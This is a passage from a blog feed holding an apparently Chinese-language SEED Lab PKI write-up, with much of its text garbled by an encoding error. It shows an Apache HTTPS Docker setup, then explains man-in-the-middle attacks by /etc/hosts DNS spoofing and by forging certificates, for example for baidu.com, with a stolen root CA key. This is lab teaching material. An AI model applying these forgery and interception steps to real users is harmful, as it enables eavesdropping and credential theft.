class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">58</span>:d3:<span class="hljs-number">59</span>:e1:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:e3:<span class="hljs-number">92</span>:<span class="hljs-number">96</span>:d4:<br>         <span class="hljs-number">1</span><span class="hljs-attribute">d</span>:d3:b3:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>:<span class="hljs-number">50</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">06</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">68</span>:<span class="hljs-number">97</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:a0:<span class="hljs-attribute">fe</span>:<span class="hljs-number">05</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">95</span>:<span class="hljs-number">95</span>:<span class="hljs-number">24</span>:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">70</span>:f2:<span class="hljs-number">69</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">eb</span>:b8:<span class="hljs-number">00</span>:a3:<span class="hljs-attribute">dc</span>:<span class="hljs-number">29</span>:<span class="hljs-number">43</span>:<span class="hljs-number">28</span>:<br>         <span class="hljs-number">51</span>:<span class="hljs-attribute">df</span>:f5:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:e6:<span class="hljs-number">89</span>:<span class="hljs-number">79</span>:<span class="hljs-number">2</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">50</span>:<span class="hljs-number">22</span>:b1:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">76</span>:<span class="hljs-number">75</span>:<span class="hljs-number">30</span>:<br>         c3:<span class="hljs-number">32</span>:<span class="hljs-number">10</span>:f0:<span class="hljs-number">73</span>:<span class="hljs-number">34</span>:<span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span>:<span class="hljs-number">64</span>:<span class="hljs-number">47</span>:<span class="hljs-number">3</span><span class="hljs-attribute">b</span>:<span class="hljs-number">39</span>:<span class="hljs-attribute">ac</span>:c1:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">ff</span>:<br>         <span class="hljs-number">61</span>:e8:f6:<span class="hljs-number">02</span>:<span class="hljs-attribute">bf</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>:<span class="hljs-number">30</span>:<span class="hljs-number">95</span>:e2:<span class="hljs-number">71</span>:<span class="hljs-number">14</span>:f1:c8:<span class="hljs-attribute">be</span>:<span class="hljs-number">42</span>:b4:<br>         f3:<span class="hljs-number">83</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">52</span>:<span class="hljs-attribute">ce</span>:d4:c2:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ed</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">91</span>:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">09</span>:<span class="hljs-number">30</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">68</span>:<br>         d4:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span>:<span class="hljs-number">81</span>:c6:<span class="hljs-attribute">fb</span>:<span class="hljs-number">32</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">78</span>:<span class="hljs-number">06</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:d7:a1:<br>         <span class="hljs-number">69</span>:a8:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e3:<span class="hljs-number">14</span>:<span class="hljs-number">59</span>:<span class="hljs-attribute">df</span>:<span class="hljs-number">95</span>:<span class="hljs-number">99</span>:<span class="hljs-attribute">fc</span>:a5:<span class="hljs-number">12</span>:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">54</span>:d4:<span class="hljs-number">03</span>:d6:<br>         <span class="hljs-attribute">cf</span>:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:a0:e1:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">66</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-number">03</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">78</span>:<span class="hljs-number">65</span>:<span class="hljs-number">60</span>:f7:<span class="hljs-number">55</span>:c9:<span class="hljs-number">79</span>:<span class="hljs-number">19</span>:<br>         <span class="hljs-attribute">fd</span>:d2:<span class="hljs-attribute">db</span>:<span class="hljs-number">45</span>:b6:c2:<span class="hljs-number">68</span>:f0:<span class="hljs-number">04</span>:<span class="hljs-number">80</span>:<span class="hljs-number">65</span>:f7:<span class="hljs-number">40</span>:<span class="hljs-number">87</span>:c3:<span class="hljs-attribute">dc</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">18</span>:<br>         <span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">82</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">16</span>:e9:<span class="hljs-number">02</span>:c9:<span class="hljs-number">58</span>:<span class="hljs-number">7</span><span class="hljs-attribute">b</span>:b5:<span class="hljs-attribute">ed</span>:<span class="hljs-number">62</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:d9:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">ca</span>:<br>         e0:c4:b2:d4:a1:<span class="hljs-number">35</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">be</span>:e6:<span class="hljs-attribute">dd</span>:<span class="hljs-attribute">fb</span>:a9:<span class="hljs-attribute">ac</span>:<span class="hljs-number">10</span>:<span class="hljs-attribute">db</span>:<br>         <span class="hljs-number">41</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:e0:e8:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">44</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:a5:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:c4:<span class="hljs-number">88</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">93</span>:<br>         <span class="hljs-number">48</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">27</span>:<span class="hljs-number">21</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-attribute">df</span>:a7:<span class="hljs-number">19</span>:f2:<span class="hljs-number">01</span>:b7:d3:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">24</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">15</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">07</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>:b4:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:b8:<span class="hljs-number">84</span>:<span class="hljs-number">25</span>:<span class="hljs-number">28</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">55</span>:e6:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>:f4:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<br>         <span class="hljs-number">36</span>:<span class="hljs-number">84</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">56</span>:<span class="hljs-number">61</span>:<span class="hljs-number">54</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">47</span>:b9:<span class="hljs-number">57</span>:<span class="hljs-attribute">bd</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:b9:d8:<span class="hljs-number">86</span>:<span class="hljs-number">82</span>:<br>         <span class="hljs-number">65</span>:<span class="hljs-number">70</span>:<span class="hljs-number">95</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">38</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">98</span>:<span class="hljs-number">17</span>:c6:<span class="hljs-number">01</span>:<span class="hljs-attribute">ac</span>:a0:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">01</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:a8:<span class="hljs-number">82</span>:<span class="hljs-number">92</span>:<br>         <span class="hljs-attribute">ca</span>:<span class="hljs-number">38</span>:<span class="hljs-number">00</span>:<span class="hljs-number">54</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">38</span>:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span>:c5:<span class="hljs-number">59</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ff</span>:<span class="hljs-number">39</span>:<span class="hljs-number">04</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">99</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">66</span>:<span class="hljs-number">07</span>:<span class="hljs-number">39</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">14</span>:a8:e6:<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">54</span>:e7:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">18</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<br>         <span class="hljs-number">72</span>:<span class="hljs-number">44</span>:b0:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">48</span>:<span class="hljs-number">92</span>:<span class="hljs-number">69</span>:<span class="hljs-number">81</span>:<span class="hljs-number">05</span>:<span class="hljs-attribute">ec</span>:<span class="hljs-number">94</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">56</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">88</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-attribute">fe</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">ac</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:e1:<span class="hljs-number">27</span>:e0:c2:<span class="hljs-number">66</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">70</span>:<span class="hljs-attribute">ea</span>:b6:d1:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">71</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">b</span>:<span class="hljs-number">92</span>:f7:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">8</span><span class="hljs-attribute">b</span>:a4:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">38</span>:<span class="hljs-number">84</span>:d3:c9:<span class="hljs-attribute">ec</span>:<span class="hljs-attribute">db</span>:f1:<span class="hljs-number">63</span>:<span class="hljs-number">89</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<br>         <span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">27</span>:<span class="hljs-number">08</span>:d3:<span class="hljs-number">16</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-4-Deploying-Certificate-in-an-Apache-Based-HTTPS-Website"><a href="#Task-4-Deploying-Certificate-in-an-Apache-Based-HTTPS-Website" class="headerlink" title="Task 4: Deploying Certificate in an Apache-Based HTTPS Website"></a>Task 4: Deploying Certificate in an Apache-Based HTTPS Website</h1><p>ç¼–è¾‘æˆ‘ä»¬è‡ªå·±ç½‘ç«™çš„apache ssl.confæ–‡ä»¶</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ cat apache_ssl<span class="hljs-selector-class">.conf</span> <br>&lt;VirtualHost *:<span class="hljs-number">443</span>&gt; <br>    DocumentRoot /var/www/gls23<br>    ServerName www<span class="hljs-selector-class">.gls23</span><span class="hljs-selector-class">.com</span><br>    ServerAlias www<span class="hljs-selector-class">.gls2023</span><span class="hljs-selector-class">.com</span><br>    ServerAlias www<span class="hljs-selector-class">.gls2024</span><span class="hljs-selector-class">.com</span><br>    DirectoryIndex index<span class="hljs-selector-class">.html</span><br>    SSLEngine On <br>    SSLCertificateFile /certs/server<span class="hljs-selector-class">.crt</span><br>    SSLCertificateKeyFile /certs/server<span class="hljs-selector-class">.key</span><br>&lt;/VirtualHost&gt;<br><span class="hljs-selector-attr">[06/22/23]</span>seed@VM:~/.../image_www$ <br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¹è¡Œã€ç¬¬åè¡Œéœ€è¦æ–‡ä»¶ã€‚å› æ­¤æŠŠserver.crtå’Œserver.keyå¤åˆ¶åˆ°å®¹å™¨çš„certsæ–‡ä»¶å¤¹</p><p>ç¼–è¾‘ä¸€ä¸‹å®¹å™¨çš„Dockerfileï¼Œå¦‚ä¸‹</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">FROM</span> dockerproxy.com<span class="hljs-regexp">/handsonsecurity/</span>seed-server:apache-php<br>  <br>ARG WWWDIR=<span class="hljs-regexp">/var/</span>www/gls23<br><br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/index.html ./i</span>ndex_red.html $WWWDIR/<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/apache_ssl.conf /</span>etc<span class="hljs-regexp">/apache2/</span>sites-available<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/certs/</span>server.crt .<span class="hljs-regexp">/certs/</span>server.key  <span class="hljs-regexp">/certs/</span><br><br>RUN  chmod <span class="hljs-number">400</span> <span class="hljs-regexp">/certs/</span>server.key \<br>     &amp;&amp; chmod <span class="hljs-number">644</span> $WWWDIR/index.html \<br>     &amp;&amp; chmod <span class="hljs-number">644</span> $WWWDIR/index_red.html \<br>     &amp;&amp; a2enmod ssl \<br>     &amp;&amp; a2ensite apache_ssl <br>     <br><br>CMD  tail -f <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ„å»ºå®¹å™¨é•œåƒã€è¿è¡Œå®¹å™¨ã€è¿›å…¥å®¹å™¨å†…éƒ¨ã€å¯åŠ¨ApacheæœåŠ¡</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> dcbuild<br><br><span class="hljs-variable">$</span> dcup<br><br><span class="hljs-variable">$</span> docker image <span class="hljs-built_in">ls</span> <br><br><span class="hljs-variable">$</span> docker <span class="hljs-built_in">ps</span> <br><br><span class="hljs-variable">$</span> docksh <span class="hljs-comment"># è¿›å…¥å®¹å™¨å†…éƒ¨</span><br><br><span class="hljs-variable">$</span> service apache2 <span class="hljs-built_in">start</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.gls.show/img/image-20230623155309100.png"></p><p>åœ¨Firefoxä¸­è¾“å…¥about:preferences#privacyï¼Œåœ¨Authorities tabå¯¼å…¥æˆ‘ä»¬çš„CAå¹¶é€‰æ‹©Trust this CA to identify web sitesï¼Œæœ€åè®¿é—®<a href="https://www.example.com/">https://www.example.com</a>  å³å¯</p><h1 id="Task-5-Launching-a-Man-In-The-Middle-Attack"><a href="#Task-5-Launching-a-Man-In-The-Middle-Attack" class="headerlink" title="Task 5: Launching a Man-In-The-Middle Attack"></a>Task 5: Launching a Man-In-The-Middle Attack</h1><blockquote><p>ä¸­é—´äººæ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨å®‰å…¨é€šä¿¡çš„å»ºç«‹é˜¶æ®µï¼Œä¾‹å¦‚ä½¿ç”¨SSL/TLSåŠ å¯†çš„HTTPSè¿æ¥ã€‚æ”»å‡»è€…ä¼šå†’å……æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼ŒåŒæ—¶ä¸æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯åˆ†åˆ«å»ºç«‹ç‹¬ç«‹çš„è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥ç”Ÿæˆè‡ªå·±çš„ä¼ªé€ è¯ä¹¦ï¼Œä¸å®¢æˆ·ç«¯å»ºç«‹å®‰å…¨è¿æ¥å¹¶å°†è‡ªå·±çš„ä¼ªé€ è¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ï¼ŒåŒæ—¶ä¸æœåŠ¡å™¨å»ºç«‹å¦ä¸€ä¸ªå®‰å…¨è¿æ¥å¹¶å°†å®¢æˆ·ç«¯çš„è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ä¸­æ‹¦æˆªã€æŸ¥çœ‹å’Œä¿®æ”¹æ•°æ®ã€‚</p><p>ä¸ºäº†é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œé€šå¸¸ä½¿ç”¨è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ç­¾å‘çš„å¯ä¿¡è¯ä¹¦æ¥éªŒè¯æœåŠ¡å™¨çš„èº«ä»½ã€‚å®¢æˆ·ç«¯ä¼šå¯¹æœåŠ¡å™¨çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼ŒåŒ…æ‹¬éªŒè¯è¯ä¹¦çš„æœ‰æ•ˆæ€§ã€åˆæ³•æ€§å’Œæ‰€å±çš„é¢å‘æœºæ„ç­‰ã€‚</p></blockquote><p>å‡ ç§æ–¹æ³•å¯ä»¥è®©ç”¨æˆ·çš„ HTTPS è¯·æ±‚åˆ°è¾¾æˆ‘ä»¬çš„ Web æœåŠ¡å™¨ã€‚</p><ul><li>ä¸€ç§æ–¹æ³•æ˜¯æ”»å‡»è·¯ç”±ï¼Œè¿™æ ·ç”¨æˆ·çš„ HTTPS è¯·æ±‚å°±è¢«è·¯ç”±åˆ°æˆ‘ä»¬çš„ Web æœåŠ¡å™¨ã€‚</li><li>å¦ä¸€ç§æ–¹æ³•æ˜¯æ”»å‡» DNSï¼Œæ‰€ä»¥å½“å—å®³è€…çš„æœºå™¨è¯•å›¾æ‰¾å‡ºç›®æ ‡ç½‘ç»œæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œå®ƒå¾—åˆ°æˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡å™¨çš„ IP åœ°å€ã€‚</li></ul><p>åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬æ¨¡æ‹Ÿäº†æ”»å‡»-DNS çš„æ–¹æ³•ã€‚æˆ‘ä»¬åªéœ€ä¿®æ”¹å—å®³è€…æœºå™¨çš„/etc/hosts æ–‡ä»¶ï¼Œé€šè¿‡å°†ä¸»æœºå <a href="http://www.example.com/">www.example.com</a> æ˜ å°„åˆ°æˆ‘ä»¬çš„æ¶æ„ç½‘ç»œæœåŠ¡å™¨ï¼Œæ¥æ¨¡æ‹Ÿ DNS ç¼“å­˜å®šä½æ”»å‡»çš„ç»“æœï¼Œè€Œä¸æ˜¯å¯åŠ¨ä¸€ä¸ªå®é™…çš„ DNS åŸŸåæœåŠ¡å™¨ç¼“å­˜æ±¡æŸ“ã€‚</p><p>task4ä¸­ï¼Œå·²ç»å»ºç«‹äº†ä¸€ä¸ª HTTPS ç½‘ç«™ï¼Œè¿™ä¸ªä»»åŠ¡ä¸­ä½¿ç”¨ç›¸åŒçš„ Apache æœåŠ¡å™¨æ¥æ¨¡æ‹Ÿ <a href="http://www.example.com/">www.example.com</a> ã€‚æ–¹æ³•ç±»ä¼¼æŒ‰ç…§ Task 4ä¸­çš„æŒ‡ä»¤å‘ Apache çš„ SSL é…ç½®æ–‡ä»¶æ·»åŠ ä¸€ä¸ª VirtualHost æ¡ç›®: ServerName åº”è¯¥æ˜¯ <a href="http://www.example.com/">www.example.com</a></p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¯ä»¥å°†baidu.comæ˜ å°„åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œè®©å—å®³è€…ä»¥ä¸ºè‡ªå·±è®¿é—®äº†ç™¾åº¦ï¼Œä½†æ˜¯å…¶å®æ˜¯è®¿é—®äº†æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰ç”Ÿæˆçš„è‡ªç­¾åCAç»™ç™¾åº¦ç­¾ä¸€ä¸ªè¯ä¹¦ï¼Œå¦‚æœæµè§ˆå™¨åŠ è½½äº†æˆ‘ä»¬çš„CAï¼Œé‚£ä¹ˆå—å®³è€…è®¿é—®ç™¾åº¦çš„æ—¶å€™ï¼Œå°±ä¼šæ˜¾ç¤ºhttpsæ­£å¸¸ï¼Œé€šè¿‡äº†è¯ä¹¦æ ¸éªŒ</p><h1 id="Task-6-Launching-a-Man-In-The-Middle-Attack-with-a-Compromised-CA"><a href="#Task-6-Launching-a-Man-In-The-Middle-Attack-with-a-Compromised-CA" class="headerlink" title="Task 6: Launching a Man-In-The-Middle Attack with a Compromised CA"></a>Task 6: Launching a Man-In-The-Middle Attack with a Compromised CA</h1><blockquote><p>åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å‡è®¾åœ¨ Task 1ä¸­åˆ›å»ºçš„æ ¹ CA å—åˆ°æ”»å‡»è€…çš„æ”»å‡»ï¼Œå¹¶ä¸”å®ƒçš„ç§é’¥è¢«ç›—å–äº†ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤ CA çš„ç§é’¥ç”Ÿæˆä»»æ„è¯ä¹¦ã€‚åœ¨è¿™é¡¹ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°è¿™ç§å¦¥åçš„åæœã€‚è¯·è®¾è®¡ä¸€ä¸ªå®éªŒæ¥è¯æ˜æ”»å‡»è€…å¯ä»¥æˆåŠŸåœ°åœ¨ä»»ä½• HTTPS ç½‘ç«™ä¸Šå¯åŠ¨ MITM æ”»å‡»ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åœ¨ Task 5ä¸­åˆ›å»ºçš„ç›¸åŒè®¾ç½®ï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ï¼Œæ‚¨éœ€è¦è¯æ˜ MITM æ”»å‡»æ˜¯æˆåŠŸçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å—å®³è€…è¯•å›¾è®¿é—®ä¸€ä¸ªç½‘ç«™ä½†æ˜¯ç™»å½•åˆ° MITM æ”»å‡»è€…çš„å‡ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ä¸ä¼šå¼•èµ·ä»»ä½•æ€€ç–‘ã€‚</p></blockquote><p>åœ¨task5ä¸­çš„å™è¿°æè¿°äº†æˆ‘ä»¬ä½¿ç”¨è‡ªå·±çš„<strong>è‡ªç­¾åCAå¯¼å…¥åˆ°æµè§ˆå™¨</strong>çš„æƒ…å†µï¼Œä½†æ˜¯å¦‚æœ<strong>æ ¹CAç§é’¥</strong>è¢«ç›—å–äº†ä¼šæœ‰æ›´ä¸¥é‡çš„åæœï¼š</p><ol><li>ä¼ªé€ è¯ä¹¦ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ ¹è¯ä¹¦çš„ç§é’¥ç­¾å‘ä¼ªé€ çš„è¯ä¹¦ï¼Œæ¨¡æ‹Ÿåˆæ³•çš„ç½‘ç«™æˆ–æœåŠ¡ï¼Œä½¿å…¶çœ‹èµ·æ¥å…·æœ‰åˆæ³•çš„èº«ä»½å’Œå¯ä¿¡çš„å®‰å…¨æ€§ã€‚è¿™å°†å¯¼è‡´ç”¨æˆ·è¯¯è®¤ä¸ºä¸çœŸå®ç½‘ç«™æˆ–æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œä»è€Œæš´éœ²ä»–ä»¬çš„æ•æ„Ÿä¿¡æ¯ã€‚</li><li>ä¸­é—´äººæ”»å‡»ï¼šé€šè¿‡æ‹¦æˆªé€šä¿¡å¹¶ä½¿ç”¨ä¼ªé€ çš„è¯ä¹¦ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œç›‘è§†å’Œä¿®æ”¹é€šä¿¡å†…å®¹ï¼Œçªƒå–æ•æ„Ÿä¿¡æ¯æˆ–æ³¨å…¥æ¶æ„å†…å®¹ã€‚è¿™å¯¹ç”¨æˆ·ã€ç½‘ç«™å’Œç³»ç»Ÿçš„å®‰å…¨æ€§æ„æˆäº†ä¸¥é‡å¨èƒã€‚</li><li>ç¯¡æ”¹å’ŒåŠ«æŒï¼šæ”»å‡»è€…å¯ä»¥ç¯¡æ”¹é€šè¿‡ä¼ªé€ è¯ä¹¦è¿›è¡ŒåŠ å¯†çš„é€šä¿¡å†…å®¹ï¼Œä¾‹å¦‚ä¿®æ”¹ä¸‹è½½æ–‡ä»¶ã€æ³¨å…¥æ¶æ„ä»£ç æˆ–åŠ«æŒç”¨æˆ·çš„ä¼šè¯ã€‚</li><li>ä¿¡ä»»ç ´è£‚ï¼šå¦‚æœæ ¹è¯ä¹¦çš„ç§é’¥è¢«ç›—å–ï¼Œä¿¡ä»»é“¾ä¸­çš„æ‰€æœ‰è¯ä¹¦éƒ½å°†å—åˆ°å¨èƒï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿçš„ä¿¡ä»»ç ´è£‚ã€‚è¿™å°†å¯¹è¯ä¹¦åŸºç¡€è®¾æ–½çš„å®‰å…¨æ€§å’Œå¯ä¿¡åº¦äº§ç”Ÿé•¿æœŸçš„è´Ÿé¢å½±å“ã€‚</li></ol><p>å®éªŒæ­¥éª¤ä¸ä¹‹å‰ç±»ä¼¼ï¼Œä½¿ç”¨æ ¹CAç­¾åè¯ä¹¦ï¼Œä¼ªé€ è¯ä¹¦åœ¨æµè§ˆå™¨è¿›è¡Œè®¿é—®æ—¶ä¸è®¸ä»»ä½•è®¾ç½®éƒ½ä¼šè¢«ä¿¡ä»»</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-labï¼šmalloc lab</title>
    <link href="/p/2c54864f/"/>
    <url>/p/2c54864f/</url>
    
